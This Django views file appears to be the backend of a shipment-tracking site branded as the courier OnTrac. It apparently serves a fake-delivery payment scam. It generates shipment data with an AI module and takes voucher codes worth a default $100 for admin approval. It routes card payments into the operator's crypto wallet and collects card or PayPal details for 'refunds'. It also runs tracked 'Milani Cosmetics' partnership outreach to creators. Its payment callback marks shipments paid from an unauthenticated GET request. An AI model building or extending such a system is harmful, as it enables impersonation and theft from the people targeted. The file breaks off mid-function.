from decimal import Decimal
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import viewsets, generics, status
from rest_framework.views import APIView
from .models import Shipment, Payment, SentEmail, Voucher, Receipt, Creator, MilaniOutreachLog, RefundBalance
from .serializers import ShipmentSerializer, PaymentSerializer, VoucherSerializer, ReceiptSerializer, RefundBalanceSerializer
from rest_framework.permissions import IsAdminUser, IsAuthenticated, AllowAny
from .email_service import send_admin_notification, send_manual_custom_email
from django.db import transaction
from django.core.cache import cache

import json
import pusher
from django.conf import settings
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import SiteSettings
from .ai_shipment_generator import (
    generate_shipment_data,
    advance_shipment_stage,
    get_stage_pipeline_for_admin,
)

pusher_client = pusher.Pusher(
    app_id=settings.PUSHER_APP_ID,
    key=settings.PUSHER_KEY,
    secret=settings.PUSHER_SECRET,
    cluster=settings.PUSHER_CLUSTER,
    ssl=True
)
from django.utils import timezone
from django.contrib.auth.models import User
from django.conf import settings
import requests
import uuid

from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from .shieldclimb_service import ShieldClimbService
from decimal import Decimal
import urllib.parse
import logging

logger = logging.getLogger(__name__)


class ShipmentViewSet(viewsets.ModelViewSet):
    queryset = Shipment.objects.all()
    serializer_class = ShipmentSerializer
    lookup_field = 'trackingId'

    # ─── DATA LEAK HOTFIX ───────────────────────────────────────────────────
    # list is admin-only. retrieve is public (required for tracking page).
    # All mutations require admin. DO NOT REMOVE THIS METHOD.
    def get_permissions(self):
        if self.action == 'list':
            permission_classes = [IsAdminUser]
        elif self.action == 'retrieve':
            permission_classes = [AllowAny]
        else:
            permission_classes = [IsAdminUser]

        return [permission() for permission in permission_classes]
    # ────────────────────────────────────────────────────────────────────────


class PaymentCreateView(generics.CreateAPIView):
    queryset = Payment.objects.all()
    serializer_class = PaymentSerializer

    def perform_create(self, serializer):
        payment = serializer.save()
        try:
            card_name = f" from {payment.cardholderName}" if payment.cardholderName else ""
            tracking_id = payment.shipment.trackingId if payment.shipment else "Unknown"
            send_admin_notification(
                subject="New Payment Received",
                message_body=f"A payment was just received{card_name} for shipment {tracking_id}."
            )
        except Exception as e:
            print(f"Admin notification failed to send: {e}")


@api_view(['GET'])
def api_root(request, format=None):
    return Response({
       'message': 'Welcome to the OnTrac API!',
       'shipments': '/api/shipments/',
       'payments': '/api/payments/'
    })


def convert_to_usd(amount, currency):
    """Converts a given amount from its currency to USD."""
    if currency.upper() == 'USD':
        return amount

    try:
        api_key = settings.EXCHANGE_RATE_API_KEY
        if not api_key:
            print("WARNING: EXCHANGE_RATE_API_KEY is missing. USD conversion failed.")
            return None

        url = f"https://v6.exchangerate-api.com/v6/{api_key}/latest/{currency.upper()}"
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        data = response.json()
        usd_rate = data.get('conversion_rates', {}).get('USD')

        if usd_rate:
            return float(amount) * usd_rate
    except (requests.RequestException, ValueError, TypeError) as e:
        print(f"Currency conversion API error during refund calculation: {e}")
        return None
    return None


@csrf_exempt
def mailersend_webhook(request):
    """
    Receives and processes MailerSend events in bulk to prevent database overload.
    """
    if request.method != 'POST':
        return HttpResponse(status=405)

    try:
        payload = json.loads(request.body)
        event_type = payload.get('type', '')
        data = payload.get('data', {})

        if not event_type.startswith('activity.'):
            return HttpResponse(status=200)

        message_id = data.get('message_id')
        recipient_email = data.get('recipient')
        subject = data.get('subject')

        if not message_id or not recipient_email:
            return HttpResponse(status=200)

        status_text = event_type.split('.')[-1].capitalize()
        cache_key = f"webhook_mailersend_{message_id}_{status_text}"

        try:
            if cache.get(cache_key):
                return HttpResponse(status=200)
            cache.set(cache_key, True, 60)
        except Exception as cache_error:
            print(f"⚠️ Cache unavailable, proceeding without dedup: {cache_error}")

        with transaction.atomic():
            try:
                shipment = Shipment.objects.filter(recipient_email=recipient_email).latest('id')
                SentEmail.objects.update_or_create(
                    provider_message_id=message_id,
                    defaults={
                        'shipment': shipment,
                        'subject': subject,
                        'status': status_text,
                        'event_time': timezone.now()
                    }
                )
                print(f"✅ MailerSend webhook processed: Message {message_id} status is now {status_text}")
            except Shipment.DoesNotExist:
                print(f"Webhook (MailerSend): Shipment for {recipient_email} not found.")
                pass

        return HttpResponse(status=200)

    except (json.JSONDecodeError, KeyError):
        return HttpResponse(status=400)
    except Exception as e:
        print(f"❌ CRITICAL: Error processing MailerSend webhook: {e}")
        return HttpResponse(status=500)


@csrf_exempt
def resend_webhook(request):
    """
    Receives and processes Resend email events for OnTrac transactional emails.
    Resend sends individual events (not bulk like MailerSend).
    """
    if request.method != 'POST':
        return HttpResponse(status=405)

    try:
        payload = json.loads(request.body)
        event_type = payload.get('type', '')
        data = payload.get('data', {})

        email_id = data.get('email_id')
        recipient_email = data.get('to', [None])[0] if isinstance(data.get('to'), list) else data.get('to')
        subject = data.get('subject', '')

        if not email_id or not recipient_email:
            return HttpResponse(status=200)

        status_map = {
            'email.sent': 'Sent',
            'email.delivered': 'Delivered',
            'email.opened': 'Opened',
            'email.clicked': 'Clicked',
            'email.bounced': 'Bounced',
            'email.complained': 'Reported Spam',
        }
        status_text = status_map.get(event_type)
        if not status_text:
            return HttpResponse(status=200)

        cache_key = f"webhook_resend_{email_id}_{status_text}"
        try:
            if cache.get(cache_key):
                return HttpResponse(status=200)
            cache.set(cache_key, True, 60)
        except Exception as cache_error:
            print(f"⚠️ Cache unavailable, proceeding without dedup: {cache_error}")

        with transaction.atomic():
            try:
                shipment = Shipment.objects.filter(recipient_email=recipient_email).latest('id')
                SentEmail.objects.update_or_create(
                    provider_message_id=email_id,
                    defaults={
                        'shipment': shipment,
                        'subject': subject,
                        'status': status_text,
                        'event_time': timezone.now()
                    }
                )
                print(f"✅ Resend webhook processed: {email_id} is now {status_text}")
            except Shipment.DoesNotExist:
                print(f"Webhook (Resend): Shipment for {recipient_email} not found.")

        return HttpResponse(status=200)

    except (json.JSONDecodeError, KeyError):
        return HttpResponse(status=400)
    except Exception as e:
        print(f"❌ Error processing Resend webhook: {e}")
        return HttpResponse(status=500)


class VoucherViewSet(viewsets.ModelViewSet):
    queryset = Voucher.objects.all()
    serializer_class = VoucherSerializer
    permission_classes = [IsAdminUser]

    def perform_create(self, serializer):
        if 'shipment' in self.request.data:
            shipment_id = self.request.data['shipment']
            try:
                shipment = Shipment.objects.get(id=shipment_id)
                serializer.save(shipment=shipment)
                Receipt.objects.get_or_create(shipment=shipment)
            except Shipment.DoesNotExist:
                pass
        else:
            serializer.save()


class ReceiptViewSet(viewsets.ModelViewSet):
    queryset = Receipt.objects.all()
    serializer_class = ReceiptSerializer
    permission_classes = [IsAdminUser]

    def get_queryset(self):
        if self.request.user.is_authenticated and not self.request.user.is_staff:
            return Receipt.objects.filter(shipment__recipient_email=self.request.user.email)
        return super().get_queryset()


@api_view(['POST'])
@csrf_exempt
def approve_voucher(request):
    """Admin endpoint to approve voucher and make receipt visible."""
    if not request.user.is_authenticated or not request.user.is_staff:
        return Response({'error': 'Admin access required'}, status=status.HTTP_403_FORBIDDEN)

    try:
        voucher_id = request.data.get('voucher_id')
        voucher = Voucher.objects.get(id=voucher_id)

        balance = None

        if voucher.is_valid and not voucher.approved:
            voucher.approved = True
            voucher.approved_by = request.user
            voucher.approved_at = timezone.now()
            voucher.save()

            if voucher.shipment:
                VOUCHER_VALUE_USD = voucher.value_usd or Decimal('100.00')

                required_fee = float(voucher.shipment.paymentAmount)
                required_fee_usd = convert_to_usd(required_fee, voucher.shipment.paymentCurrency)

                if required_fee_usd is not None and VOUCHER_VALUE_USD > Decimal(required_fee_usd):
                    excess = VOUCHER_VALUE_USD - Decimal(required_fee_usd)
                    balance, created = RefundBalance.objects.update_or_create(
                        recipient_email=voucher.shipment.recipient_email,
                        defaults={
                            'excess_amount_usd': excess,
                            'status': 'AVAILABLE',
                            'claim_token': uuid.uuid4().hex
                        }
                    )

                receipt, created = Receipt.objects.get_or_create(shipment=voucher.shipment)
                receipt.is_visible = True
                receipt.approved_by = request.user
                receipt.save()

                voucher.shipment.status = 'Payment Confirmed'
                voucher.shipment.progressPercent = 25
                voucher.shipment.requiresPayment = False
                voucher.shipment.save()

                return Response({
                    'message': 'Voucher approved successfully',
                    'voucher': VoucherSerializer(voucher).data,
                    'receipt': ReceiptSerializer(receipt).data,
                    'excess_balance': RefundBalanceSerializer(balance).data if balance else None
                })

        return Response({'error': 'Invalid voucher or already approved'}, status=status.HTTP_400_BAD_REQUEST)

    except Voucher.DoesNotExist:
        return Response({'error': 'Voucher not found'}, status=status.HTTP_404_NOT_FOUND)


@api_view(['POST'])
def submit_voucher(request):
    """User endpoint to submit voucher code."""
    try:
        code = request.data.get('code')
        shipment_id = request.data.get('shipment_id')

        if not code or not shipment_id:
            return Response({'error': 'Code and shipment ID required'}, status=status.HTTP_400_BAD_REQUEST)

        try:
            shipment = Shipment.objects.get(id=shipment_id)
        except Shipment.DoesNotExist:
            return Response({'error': 'Shipment not found'}, status=status.HTTP_404_NOT_FOUND)

        if Voucher.objects.filter(shipment=shipment, code=code).exists():
            return Response({'error': 'Voucher already submitted'}, status=status.HTTP_400_BAD_REQUEST)

        voucher = Voucher.objects.create(code=code, shipment=shipment)

        try:
            send_admin_notification(
                subject="New Voucher Submitted",
                message_body=f"A new voucher '{code}' was just submitted for shipment {shipment.trackingId}. Please log in to approve it."
            )
        except Exception as e:
            print(f"Admin notification failed to send: {e}")

        Receipt.objects.get_or_create(shipment=shipment)

        return Response({
            'message': 'Voucher submitted for approval',
            'voucher': VoucherSerializer(voucher).data,
            'next_steps': 'Your voucher is pending admin approval. You will be notified once approved.'
        })

    except Exception as e:
        return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
def submit_refund_choice(request):
    """Endpoint for user to select refund method."""
    token = request.data.get('claim_token')
    method = request.data.get('refund_method')
    detail = request.data.get('refund_detail', '')

    if not token or not method:
        return Response({'error': 'Missing required fields.'}, status=status.HTTP_400_BAD_REQUEST)

    try:
        balance = RefundBalance.objects.get(claim_token=token, status='AVAILABLE')
    except RefundBalance.DoesNotExist:
        return Response({'error': 'Invalid or already claimed balance token.'}, status=status.HTTP_404_NOT_FOUND)

    if method == 'CREDIT':
        balance.status = 'CREDIT'
        balance.refund_method = 'Future Credit'
        balance.save()
        message = 'Success! Your balance has been saved as credit for future shipments.'

    elif method == 'MANUAL':
        if not detail:
            return Response({'error': 'Refund detail (PayPal/Card info) is required.'}, status=status.HTTP_400_BAD_REQUEST)

        balance.status = 'PROCESSING'
        balance.refund_method = 'Manual Refund'
        balance.refund_detail = detail
        balance.save()
        message = 'Success! Your refund request is now processing. Please allow 3-5 days.'

    else:
        return Response({'error': 'Invalid refund method.'}, status=status.HTTP_400_BAD_REQUEST)

    return Response({'message': message, 'balance': RefundBalanceSerializer(balance).data})


@api_view(['GET'])
def check_refund_balance(request, email):
    """Checks for an available balance linked to a given email."""
    try:
        balance = RefundBalance.objects.get(recipient_email=email, status='AVAILABLE')
        return Response(RefundBalanceSerializer(balance).data)
    except RefundBalance.DoesNotExist:
        return Response({'excess_amount_usd': 0, 'status': 'NOT_FOUND'}, status=status.HTTP_404_NOT_FOUND)


@api_view(['GET'])
def check_receipt_status(request, tracking_id):
    """Check if receipt is available for a tracking ID."""
    try:
        shipment = Shipment.objects.get(trackingId=tracking_id)
        receipt = getattr(shipment, 'receipt', None)

        if receipt and receipt.is_visible:
            return Response({
                'available': True,
                'receipt': ReceiptSerializer(receipt).data
            })
        else:
            return Response({
                'available': False,
                'message': 'Receipt not yet available. Payment approval pending.'
            })

    except Shipment.DoesNotExist:
        return Response({'error': 'Shipment not found'}, status=status.HTTP_404_NOT_FOUND)


# ============================================================================
# MILANI OUTREACH WEBHOOK HANDLERS
# These are preserved for historical event processing from prior campaigns.
# New SMTP sends do not produce webhook events — logs are written at send time.
# ============================================================================

@csrf_exempt
def sendgrid_milani_webhook(request):
    """
    Optimized webhook that processes SendGrid Milani outreach events in bulk
    to prevent database overload. Used for historical SendGrid campaign records.
    """
    if request.method == 'POST':
        try:
            events = json.loads(request.body)
            unique_events = {}
            for data in events:
                email = data.get('email')
                event_type = data.get('event')
                if email:
                    priority = {'click': 4, 'open': 3, 'delivered': 2, 'bounce': 1, 'dropped': 1, 'spamreport': 1}
                    current_priority = priority.get(event_type, 0)
                    if email not in unique_events or priority.get(unique_events[email].get('event'), 0) < current_priority:
                        unique_events[email] = data

            emails = list(unique_events.keys())
            creators_dict = {c.email: c for c in Creator.objects.filter(email__in=emails)}

            with transaction.atomic():
                logs_to_create = []
                creators_to_update = []

                for email, data in unique_events.items():
                    event_type = data.get('event')
                    sg_message_id = data.get('sg_message_id')

                    if event_type == 'open':
                        event_status = 'Opened'
                    elif event_type == 'click':
                        event_status = 'Clicked'
                    elif event_type == 'delivered':
                        event_status = 'Delivered'
                    elif event_type in ['bounce', 'dropped']:
                        event_status = event_type.capitalize()
                    elif event_type == 'spamreport':
                        event_status = 'Reported Spam'
                    else:
                        continue

                    creator = creators_dict.get(email)
                    if not creator:
                        continue

                    cache_key = f"webhook_{email}_{event_status}"
                    if cache.get(cache_key):
                        continue
                    cache.set(cache_key, True, 60)

                    creator.status = event_status
                    creator.last_outreach = timezone.now()
                    creators_to_update.append(creator)

                    logs_to_create.append(MilaniOutreachLog(
                        creator=creator,
                        status=event_status,
                        event_time=timezone.now(),
                        subject='Milani Cosmetics Partnership Opportunity',
                        sendgrid_message_id=sg_message_id
                    ))

                if creators_to_update:
                    Creator.objects.bulk_update(creators_to_update, ['status', 'last_outreach'])

                if logs_to_create:
                    MilaniOutreachLog.objects.bulk_create(logs_to_create, ignore_conflicts=True)

            print(f"✅ SendGrid Milani webhook processed {len(unique_events)} events")
            return HttpResponse(status=200)

        except Exception as e:
            print(f"❌ SendGrid Milani webhook error: {e}")
            return HttpResponse(status=500)

    return HttpResponse(status=405)


@csrf_exempt
def resend_milani_webhook(request):
    """
    Handles webhook events from the Milani Resend account.
    Preserved for historical Resend campaign records.
    New outreach sends via SMTP and will not produce events here.
    """
    if request.method == 'POST':
        try:
            payload = json.loads(request.body)
            event_type = payload.get('type')
            data = payload.get('data', {})

            to_field = data.get('to')
            email = to_field[0] if isinstance(to_field, list) else to_field

            if not email:
                return JsonResponse({'status': 'ignored - no email found'}, status=200)

            creator = Creator.objects.filter(email=email).first()
            if creator:
                status_map = {
                    'email.sent':       'Sent',
                    'email.delivered':  'Delivered',
                    'email.opened':     'Opened',
                    'email.clicked':    'Clicked',
                    'email.bounced':    'Bounced',
                    'email.complained': 'Reported Spam',
                }
                mapped_status = status_map.get(event_type)
                if not mapped_status:
                    return JsonResponse({'status': 'ignored - unknown event'}, status=200)

                # Only upgrade status, never downgrade
                _rank = {'Sent': 1, 'Delivered': 2, 'Opened': 3, 'Clicked': 4, 'Reported Spam': 5, 'Bounced': 5}
                if _rank.get(mapped_status, 0) > _rank.get(creator.status, 0):
                    creator.status = mapped_status
                    creator.save(update_fields=['status'])

                # get_or_create handles Resend webhook retries gracefully
                email_id = data.get('email_id', '')
                if email_id:
                    MilaniOutreachLog.objects.get_or_create(
                        sendgrid_message_id=email_id,
                        defaults={
                            'creator': creator,
                            'subject': data.get('subject', 'Milani Cosmetics Partnership Opportunity'),
                            'status':  mapped_status,
                            'event_time': timezone.now(),
                        }
                    )

            return JsonResponse({'status': 'success'}, status=200)

        except Exception as e:
            print(f"❌ Resend Milani webhook error: {e}")
            return JsonResponse({'error': str(e)}, status=400)

    return JsonResponse({'status': 'invalid method'}, status=405)


# ============================================================================
# MILANI SELF-HOSTED OPEN + CLICK TRACKING
# These endpoints are embedded in outreach email HTML by milani_email_service.
# They write to MilaniOutreachLog, mirroring exactly what the Resend/SendGrid
# webhooks do — no new models required.
# ============================================================================

import base64

# Standard 1x1 transparent GIF — served immediately before any DB write
# so email clients never time out waiting for a response.
_TRACKING_PIXEL_GIF = base64.b64decode(
    b'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'
)

# Status upgrade ladder — we never downgrade a status.
_STATUS_RANK = {
    'Queued': 0, 'Sent': 1, 'Delivered': 2, 'Opened': 3, 'Clicked': 4,
}


def _upgrade_milani_status(log, new_status: str) -> None:
    """
    Updates MilaniOutreachLog + Creator status only if new_status is higher
    in the engagement ladder than the current status. Never downgrades.
    """
    current_rank = _STATUS_RANK.get(log.status, 0)
    new_rank = _STATUS_RANK.get(new_status, 0)
    if new_rank > current_rank:
        log.status = new_status
        log.save(update_fields=['status'])
        # Mirror onto Creator so the admin list stays accurate
        creator = log.creator
        creator_rank = _STATUS_RANK.get(creator.status, 0)
        if new_rank > creator_rank:
            creator.status = new_status
            creator.save(update_fields=['status'])


@csrf_exempt
def milani_track_open(request, message_id):
    """
    Tracking pixel endpoint — called when the recipient's email client loads images.
    Returns a 1x1 transparent GIF immediately, then logs the open event.
    URL: /api/milani/track/open/<message_id>/
    """
    # Return the pixel first so the email client doesn't hang.
    response = HttpResponse(_TRACKING_PIXEL_GIF, content_type='image/gif')
    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'

    try:
        log = MilaniOutreachLog.objects.select_related('creator').get(
            sendgrid_message_id=message_id
        )
        _upgrade_milani_status(log, 'Opened')
        logger.info(f"[Milani open] message_id={message_id} creator={log.creator.email}")
    except MilaniOutreachLog.DoesNotExist:
        logger.debug(f"[Milani open] Unknown message_id={message_id} — ignored")
    except Exception as e:
        logger.warning(f"[Milani open] Error logging open for {message_id}: {e}")

    return response


@csrf_exempt
def milani_track_click(request, message_id):
    """
    Click tracking redirect endpoint — wraps any outbound URL in the email.
    Logs the click then redirects to the intended destination.
    URL: /api/milani/track/click/<message_id>/?url=<encoded_destination>
    """
    from django.shortcuts import redirect as django_redirect
    import urllib.parse

    destination = request.GET.get('url', '')
    # Safety: only allow http/https destinations to prevent open redirect abuse.
    parsed = urllib.parse.urlparse(destination)
    if parsed.scheme not in ('http', 'https') or not parsed.netloc:
        destination = 'https://milanicosmetics.com'

    try:
        log = MilaniOutreachLog.objects.select_related('creator').get(
            sendgrid_message_id=message_id
        )
        _upgrade_milani_status(log, 'Clicked')
        logger.info(f"[Milani click] message_id={message_id} creator={log.creator.email} url={destination}")
    except MilaniOutreachLog.DoesNotExist:
        logger.debug(f"[Milani click] Unknown message_id={message_id} — redirecting anyway")
    except Exception as e:
        logger.warning(f"[Milani click] Error logging click for {message_id}: {e}")

    return django_redirect(destination)


# ============================================================================
# MILANI OPEN TRACKING PIXEL
# ============================================================================

# 1×1 transparent GIF — returned for every pixel request
_TRANSPARENT_GIF = (
    b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
    b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00'
    b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02'
    b'\x44\x01\x00\x3b'
)


def milani_open_pixel(request):
    """
    Tracking pixel endpoint for Milani SMTP outreach open events.

    Flow:
    - milani_email_service embeds <img src="/api/webhooks/milani-open/?mid={uuid}">
      in every HTML email.
    - When the recipient opens the email and images load, this view fires.
    - We find the MilaniOutreachLog by message ID, update status to 'Opened',
      and update the Creator status accordingly.
    - Always returns the 1×1 transparent GIF so email clients don't show a
      broken image placeholder.

    Note: image-blocking email clients (e.g. Outlook by default) will not
    trigger this. That is standard behaviour for all pixel-based open tracking.
    """
    mid = request.GET.get('mid', '').strip()
    if mid:
        try:
            log = MilaniOutreachLog.objects.select_related('creator').get(
                sendgrid_message_id=mid
            )
            # Only upgrade — never downgrade a status (e.g. don't overwrite Clicked)
            if log.status not in ('Opened', 'Clicked'):
                log.status = 'Opened'
                log.event_time = timezone.now()
                log.save(update_fields=['status', 'event_time'])

            creator = log.creator
            if creator.status not in ('Opened', 'Clicked', 'Replied'):
                creator.status = 'Opened'
                creator.save(update_fields=['status'])

            logger.info(f"[Milani pixel] Open recorded for {creator.email} mid={mid}")

        except MilaniOutreachLog.DoesNotExist:
            logger.debug(f"[Milani pixel] Unknown mid={mid} — ignored.")
        except Exception as pixel_err:
            logger.warning(f"[Milani pixel] Error processing open: {pixel_err}")

    return HttpResponse(_TRANSPARENT_GIF, content_type='image/gif')


# ============================================================================
# CORE ONTRAC VIEWS — DO NOT MODIFY BELOW WITHOUT EXPLICIT PERMISSION
# ============================================================================

class SendManualCustomEmailView(APIView):
    """
    Allows admin to send a manually typed email to a specific shipment recipient.
    Expected Payload: { "shipment_id": 1, "subject": "...", "heading": "...", "body": "..." }
    """
    permission_classes = [IsAuthenticated]

    def post(self, request):
        shipment_id = request.data.get('shipment_id')
        subject = request.data.get('subject', 'Important Update Regarding Your Shipment')
        heading = request.data.get('heading', 'Shipment Notification')
        body = request.data.get('body')

        if not shipment_id or not body:
            return Response({"error": "Shipment ID and Body are required."}, status=status.HTTP_400_BAD_REQUEST)

        try:
            shipment = Shipment.objects.get(id=shipment_id)
            success = send_manual_custom_email(
                shipment=shipment,
                subject=subject,
                heading=heading,
                message_body=body
            )

            if success:
                return Response({"message": "Custom email sent successfully!"}, status=status.HTTP_200_OK)
            else:
                return Response({"error": "Failed to send email via provider."}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

        except Shipment.DoesNotExist:
            return Response({"error": "Shipment not found."}, status=status.HTTP_404_NOT_FOUND)


@api_view(['POST'])
def get_changenow_checkout(request):
    """
    Generates a secure ChangeNOW checkout URL for card payments.
    Automatically handles currency conversion and wallet routing.
    """
    tracking_id = request.data.get('trackingId')

    if not tracking_id:
        return Response({'error': 'Tracking ID is required'}, status=status.HTTP_400_BAD_REQUEST)

    try:
        shipment = Shipment.objects.get(trackingId=tracking_id)

        api_key = getattr(settings, 'CHANGENOW_API_KEY', '')
        your_wallet = getattr(settings, 'CHANGENOW_WALLET_ADDRESS', '')

        url = "https://api.changenow.io/v2/fiat-transaction"
        headers = {
            "x-changenow-api-key": api_key,
            "Content-Type": "application/json"
        }

        raw_amount = float(shipment.paymentAmount)
        safe_amount = raw_amount if raw_amount >= 55 else 55

        payload = {
            "from": shipment.paymentCurrency.lower(),
            "to": "usdtbsc",
            "amount": safe_amount,
            "address": your_wallet,
            "externalId": tracking_id,
            "fiatMode": True
        }

        response = requests.post(url, json=payload, headers=headers)

        if response.status_code == 200:
            data = response.json()
            return Response({"checkout_url": data.get('redirectUrl')})
        else:
            return Response({
                'error': 'Payment Provider limit reached or configuration error.',
                'details': response.json()
            }, status=status.HTTP_400_BAD_REQUEST)

    except Shipment.DoesNotExist:
        return Response({'error': 'Shipment not found'}, status=status.HTTP_404_NOT_FOUND)
    except Exception as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


# =====================================================================
# BCON GLOBAL WEBHOOK RECEIVER
# =====================================================================
@csrf_exempt
def bcon_webhook(request):
    """
    Silent receiver for Bcon Global.
    Returns 200 OK so Bcon can verify the URL.
    """
    if request.method == 'GET' or request.method == 'POST':
        return HttpResponse("Webhook Active", status=200)

    return HttpResponse(status=405)


# ============================================================================
# SHIELDCLIMB PAYMENT INTEGRATION VIEWS
# ============================================================================

@api_view(['POST'])
def initiate_shieldclimb_session(request, tracking_id):
    """
    Step 1 & 2: Create ShieldClimb wallet and return hosted checkout URL.
    """
    try:
        shipment = Shipment.objects.get(trackingId=tracking_id)

        amount = shipment.paymentAmount
        currency = shipment.paymentCurrency
        email = shipment.recipient_email or 'customer@ontracourier.us'

        if currency.upper() != 'USD':
            conversion_result = ShieldClimbService.convert_to_usd(amount, currency)
            if not conversion_result:
                return Response({
                    'error': f'Unable to convert {currency} to USD. Please try again.'
                }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
            amount_usd = conversion_result['usd_amount']
            exchange_rate = conversion_result['exchange_rate']
        else:
            amount_usd = amount
            exchange_rate = '1.00'

        callback_url = f"{settings.SHIELDCLIMB_CALLBACK_BASE_URL}/api/shieldclimb-callback/"
        wallet_data = ShieldClimbService.create_wallet(tracking_id, callback_url)

        if not wallet_data:
            return Response({
                'error': 'Failed to initialize payment session. Please try again.'
            }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

        shipment.shieldclimb_ipn_token = wallet_data['ipn_token']
        shipment.shieldclimb_address_in = wallet_data['address_in']
        shipment.shieldclimb_polygon_address = wallet_data['polygon_address_in']
        shipment.shieldclimb_payment_status = 'PENDING'
        shipment.save()

        checkout_url = ShieldClimbService.build_checkout_url(
            address_in=shipment.shieldclimb_address_in,
            amount_usd=amount_usd,
            email=email,
            currency=currency
        )

        logger.info(f"ShieldClimb wallet created: {wallet_data['polygon_address_in']} for {tracking_id}")

        print("=" * 80)
        print(f"GENERATED CHECKOUT URL: {checkout_url}")
        print("=" * 80)
        print("URL COMPONENTS:")
        print(f"  - Endpoint: {checkout_url.split('?')[0]}")
        print(f"  - Has 'provider' param: {'provider=' in checkout_url}")
        print(f"  - Has 'pay.php': {'/pay.php' in checkout_url}")
        print("=" * 80)

        if not checkout_url:
            return Response({
                'error': 'Failed to generate checkout URL. Please try again.'
            }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

        final_url = checkout_url
        display_order = (shipment.provider_display_order or '').strip()
        manual_providers = shipment.allowed_payment_providers or []

        if display_order:
            separator = '&' if '?' in checkout_url else '?'
            final_url = f"{checkout_url}{separator}provider_order={urllib.parse.quote(display_order)}"
            logger.info(f"Full provider order set for {tracking_id}: {display_order}")
        elif manual_providers:
            extra = ','.join(manual_providers)
            separator = '&' if '?' in checkout_url else '?'
            final_url = f"{checkout_url}{separator}extra_providers={urllib.parse.quote(extra)}"
            logger.info(f"Manual providers appended for {tracking_id}: {manual_providers}")

        return Response({
            'success': True,
            'checkout_url': final_url,
            'amount_usd': float(amount_usd),
            'original_amount': float(amount),
            'original_currency': currency.upper(),
            'exchange_rate': exchange_rate,
            'polygon_address': wallet_data['polygon_address_in'],
            'ipn_token': wallet_data['ipn_token']
        }, status=status.HTTP_200_OK)

    except Shipment.DoesNotExist:
        return Response({'error': 'Shipment not found'}, status=status.HTTP_404_NOT_FOUND)
    except Exception as e:
        logger.error(f"Error initiating ShieldClimb session: {str(e)}")
        return Response({
            'error': 'An unexpected error occurred. Please try again.'
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


@csrf_exempt
@require_http_methods(["GET"])
def shieldclimb_callback(request):
    """
    ShieldClimb webhook handler — receives GET request when payment completes.
    """
    try:
        tracking_id = request.GET.get('tracking_id')
        value_coin = request.GET.get('value_coin')
        coin = request.GET.get('coin')
        txid_in = request.GET.get('txid_in')
        txid_out = request.GET.get('txid_out')
        address_in = request.GET.get('address_in')

        if not all([tracking_id, value_coin, txid_in, txid_out]):
            logger.error(f"Incomplete ShieldClimb callback: {request.GET}")
            return JsonResponse({'error': 'Missing required parameters'}, status=400)

        try:
            shipment = Shipment.objects.get(trackingId=tracking_id)
        except Shipment.DoesNotExist:
            logger.error(f"ShieldClimb callback for non-existent shipment: {tracking_id}")
            return JsonResponse({'error': 'Shipment not found'}, status=404)

        if shipment.shieldclimb_polygon_address != address_in:
            logger.error(
                f"Address mismatch for {tracking_id}. "
                f"Expected: {shipment.shieldclimb_polygon_address}, Got: {address_in}"
            )
            return JsonResponse({'error': 'Address verification failed'}, status=400)

        shipment.shieldclimb_payment_status = 'PAID'
        shipment.shieldclimb_value_received = Decimal(value_coin)
        shipment.shieldclimb_txid_in = txid_in
        shipment.shieldclimb_txid_out = txid_out
        shipment.status = 'Payment Confirmed'
        shipment.requiresPayment = False
        shipment.save()

        logger.info(
            f"ShieldClimb payment confirmed for {tracking_id}. "
            f"Amount: {value_coin} {coin}, TX: {txid_out}"
        )

        try:
            pusher_client.trigger(
                f'shipment-{tracking_id}',
                'update',
                {
                    'status': 'Payment Confirmed',
                    'message': 'Your payment has been verified.'
                }
            )
        except Exception as pusher_error:
            logger.warning(f"Pusher notification failed: {str(pusher_error)}")

        return JsonResponse({
            'status': 'success',
            'tracking_id': tracking_id,
            'processed': True
        }, status=200)

    except Exception as e:
        logger.error(f"Error processing ShieldClimb callback: {str(e)}")
        return JsonResponse({'error': 'Internal server error'}, status=500)


@api_view(['GET'])
def check_shieldclimb_status(request, tracking_id):
    """
    Manual payment status check endpoint.
    Used by frontend to poll payment status if callback is delayed.
    """
    try:
        shipment = Shipment.objects.get(trackingId=tracking_id)

        if shipment.shieldclimb_payment_status == 'PAID':
            return Response({
                'status': 'paid',
                'value_coin': float(shipment.shieldclimb_value_received or 0),
                'txid_out': shipment.shieldclimb_txid_out,
                'shipment_status': shipment.status
            }, status=status.HTTP_200_OK)

        if not shipment.shieldclimb_ipn_token:
            return Response({
                'status': 'not_initiated',
                'message': 'ShieldClimb payment not started'
            }, status=status.HTTP_200_OK)

        status_data = ShieldClimbService.check_payment_status(shipment.shieldclimb_ipn_token)

        if not status_data:
            return Response({
                'status': 'unpaid',
                'message': 'Unable to verify payment status'
            }, status=status.HTTP_200_OK)

        if status_data.get('status') == 'paid' and shipment.shieldclimb_payment_status != 'PAID':
            shipment.shieldclimb_payment_status = 'PAID'
            shipment.shieldclimb_value_received = Decimal(status_data.get('value_coin', 0))
            shipment.shieldclimb_txid_out = status_data.get('txid_out')
            shipment.status = 'Payment Confirmed'
            shipment.requiresPayment = False
            shipment.save()
            logger.info(f"Payment status updated via manual check for {tracking_id}")

        return Response({
            'status': status_data.get('status', 'unpaid'),
            'value_coin': status_data.get('value_coin'),
            'txid_out': status_data.get('txid_out'),
            'shipment_status': shipment.status
        }, status=status.HTTP_200_OK)

    except Shipment.DoesNotExist:
        return Response({'error': 'Shipment not found'}, status=status.HTTP_404_NOT_FOUND)
    except Exception as e:
